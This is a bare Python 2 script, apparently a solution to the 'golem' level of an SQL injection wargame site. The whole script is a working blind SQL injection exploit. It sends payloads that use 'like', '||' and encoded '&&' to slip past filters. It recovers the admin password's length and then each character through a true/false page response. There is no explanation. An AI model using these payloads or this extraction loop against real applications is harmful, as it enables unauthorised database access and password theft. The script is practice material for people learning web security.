import urllib2
import urllib
import requests

flag = ""
length = 0

url = "https://los.eagle-jump.org/golem.php"
session = dict(PHPSESSID = "")

for i in range(0, 20):
        query = url + "?pw=1' || id like 'admin' %26%26 length(pw) like " + str(i) + "%23"
        r = requests.post(query, cookies=session)

        if 'Hello admin' in r.text:
                length = i
                break

print "password length is ",length

for j in range(1, length + 1):
        for i in range(48, 128):
                query = url + "?pw=1' || id like 'admin' %26%26 mid(pw, " + str(j) + ", 1) like '" + chr(i)
                r = requests.post(query, cookies=session)

                if 'Hello admin' in r.text:
                        flag += chr(i)
                        break

print "password is",flag
